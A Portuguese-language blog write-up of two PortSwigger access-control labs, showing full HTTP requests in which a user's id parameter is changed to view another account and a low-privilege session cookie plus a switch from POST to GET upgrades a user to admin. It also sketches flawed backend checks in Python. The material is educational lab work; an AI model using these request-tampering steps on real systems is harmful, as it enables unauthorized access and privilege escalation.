---
title: "Access Control: Series | Parte 2"
categories:
  - papers
  - web hacking
  - owasp
tags:
  - papers
  - ctf
  - owasp
  - AccessControl
---
## Access Control: Bypass em  controles

Mais uma parte da série! Trago outros cenários aqui! Vou priorizar focar mais no raciocínio do que na resolução em si. então, caso esteja buscando a resolução dos labs, está no lugar errado, sugiro ir na aba "Community Solutions" da página do lab, e ver algumas soluções alternativas.

Bem, sem mais enrolação, vamos seguir em frente.

> [!Observação] Sobre os labs...
> Vou usar alguns labs da PortSwigger como cenários a fim de treinarmos deixarei o link ds labs no final do paper, caso queira acompanhar comigo (recomendo).

### Access Control: Redirects...
Eu confesso que até hoje nunca lidei com esse tipo de coisa que você vai ver aqui. Usando o lado curioso, como sempre teste as features, sempre olhando o **request/response**.

E o caso interessante é esse aqui:

```
POST /my-account/change-email HTTP/2
Host: 0aca00ea03dd4fac83420a0600d000d7.web-security-academy.net
Cookie: session=aKYL83rwtr7NYO6Fs3sDtSCJXllchSb6
Content-Length: 62
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Origin: https://0aca00ea03dd4fac83420a0600d000d7.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aca00ea03dd4fac83420a0600d000d7.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=rato%40rataria.com&csrf=5kmtQgDPGm1osf6iaCe8BpNO1WF8XlKR


```

A resposta é normal:

```
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Até ai, nada tão "anormal" assim. 

Seguindo adiante com o fluxo, somos redirecionados para página do perfil. Tudo normal. Agora, depois do redirect, se pegarmos essa request aqui:

```
GET /my-account?id=wiener HTTP/2
Host: 0aca00ea03dd4fac83420a0600d000d7.web-security-academy.net
Cookie: session=aKYL83rwtr7NYO6Fs3sDtSCJXllchSb6
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Origin: https://0aca00ea03dd4fac83420a0600d000d7.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aca00ea03dd4fac83420a0600d000d7.web-security-academy.net/my-account/change-email
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

E mudarmos o usuário para **carlos**:

```
GET /my-account?id=carlos HTTP/2
Host: 0aca00ea03dd4fac83420a0600d000d7.web-security-academy.net
Cookie: session=aKYL83rwtr7NYO6Fs3sDtSCJXllchSb6
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Origin: https://0aca00ea03dd4fac83420a0600d000d7.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aca00ea03dd4fac83420a0600d000d7.web-security-academy.net/my-account/change-email
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Estranhamente isso acontece:

```
HTTP/2 302 Found
Location: /login
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3759

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
    
[REMOVIDO]
```

Removi o resto do código fonte para não ficar muito grande. 

Curioso, não acha? Fui buscar uma explicação do que porquê isso pode ocorrer, e possivelmente trata-se de um pressuposto errado por parte do dev da aplicação (claro, sabemos que se trata de um lab preparado para isso).

Por baixo dos panos, é como se o dev tivesse escrito assim no backed:

```python
# O dev pensou: "se veio da página de change-email, é um fluxo legítimo" 
if "/my-account/change-email" in referer: # Mas NUNCA verifica se o `id` pertence ao usuário logado! 
	user_data = users.get(requested_id)
```

Uma atrocidade, não acha? Mas eu não duvido nada que algum dev poderia cometer esse erro.

Ou, vou além, pode ser que apenas portando um **session cookie** válido, a request é aceita e a reposta é processada. Ou então, as junção das duas coisas.
### Access Control: Mudar métodos HTTP são sempre uma boa estratégia...

Esse cenário aqui é divertido e me arrisco a dizer que não é tão incomum de se encontrar. Vamos partir do ponto de vista de um usuário já autenticado, e com permissões administrativas, seria um tipo de **White Box test**. Eu já fiz esse tipo de teste em cenários reais, onde testamos não apena do ponto de vista de alguém com poucos privilégios, mas já da perspectiva de um **administrador**.

E nesse tipo de cenário, talvez você pense: tá., se já somos admin, o que vamos testar? Ao longo da sua jornada você vai perceber que só explorar não é o suficiente, a etapa de pós exploração será necessária em muitos casos para demonstrar impacto.

Nesse ponto aqui, precisamos olhar cada feature e pensar: será que um usuário com baixos privilégios conseguiria realizar uma ação como essa?

E é aí que nosso cenário se encaixa. Se você olhar no **painel administrativo** você verá que temos a opção upar os privilégios dos usuários presents na plataforma, e essa aqui é a request responsável por esse feito:

```
POST /admin-roles HTTP/2
Host: 0af700470348a5908406bd4500ff004a.web-security-academy.net
Cookie: session=72zmNGptqxswuqdqBw6Opayx2Q5xHUc0
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Origin: https://0af700470348a5908406bd4500ff004a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0af700470348a5908406bd4500ff004a.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=wiener&action=upgrade
```

Nesse caso aqui, a atenção vai ser voltada para o **session cookie**, porque seria ali o ponto de vulnerabilidade, ele é quem está determinando quem é o usuário que está realizando a ação.

Qual a primeira coisa que deve via sua cabeça? Criar (se possível) um usuário sem privilégios, pegar seu **session cookie** e usar ali no lugar do **session cookie** do administrador e ver se a aplicação aceita.

A PortSwiger nos forneceu mais um usuário, além do administrador, e ao logar com esse usuário, pegar seu **session cookie** e colocar ali no lugar, vemos algo interessante:

```
POST /admin-roles HTTP/2
Host: 0a6900fe044af29581614e41002e0035.web-security-academy.net
Cookie: session=a9AtYcOn2LZSVUeVN12yGEUbrzb0M03i
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Origin: https://0a6900fe044af29581614e41002e0035.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6900fe044af29581614e41002e0035.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=wiener&action=upgrade
```

A response:

```
HTTP/2 401 Unauthorized
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"Unauthorized"
```

A essa altura talvez você pense que caiu por terra a nossa hipótese, mas ainda não é fim. Um teste que é sempre interessante a se fazer é mudar o método da request, independente dos cenários.

E ao fazer isso, veja o que acontece:

```
POSTT /admin-roles HTTP/2
Host: 0a6900fe044af29581614e41002e0035.web-security-academy.net
Cookie: session=a9AtYcOn2LZSVUeVN12yGEUbrzb0M03i
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Origin: https://0a6900fe044af29581614e41002e0035.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6900fe044af29581614e41002e0035.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=wiener&action=upgrade
```

A response:

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 30

"Missing parameter 'username'"
```

Interessante, não acha? Veja que  eu apenas adicionei um "T" a mais ali em `POST` e olhe a resposta que recebemos. Parece que foi interpretado com um `GET` , que loucura.

Agora, quando mudamos completamente para `GET` , olha o que acontece:

```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a6900fe044af29581614e41002e0035.web-security-academy.net
Cookie: session=a9AtYcOn2LZSVUeVN12yGEUbrzb0M03i
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Origin: https://0a6900fe044af29581614e41002e0035.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6900fe044af29581614e41002e0035.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

A response:

```
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

A aplicação aceitou! Independente do **session cookie** ser de um administrador ou não.

No backend, o dev pode ter posto algo assim:

```python
if request.method == "POST":  
	check_if_admin()
```

Está checando apenas para método POST e não para outros também. Claro, trata-se de um cenário criado intencionalmente para isso, mas esse tipo de falha não é tão incomum assim de se achar no cenário real.
## No fim

O último cenário é interessante, não acha? Claro, essa abordagem seria partindo de um teste **White Box**, onde já sabemos as features e temos os privilégios necessários para isso. Ou talvez quisesse simular um cenário de persistência, após escalar seus privilégios, aí vai da sua criatividade. 

Já no primeiro cenário não sei ao certo onde se encaixaria, mas certamente vale a pena ter esse caso em mente, afinal, não sabemos o que se passa na cabeça dos devs. Na próxima parte trarei outros dois cenários muito interessantes também, te vejo na próxima!

Muito obrigado!
Até breve!

---
Para saber mais sobre [Access Control](https://portswigger.net/web-security/access-control)
[Link](https://portswigger.net/web-security/all-labs#access-control-vulnerabilities) para todos os labs.

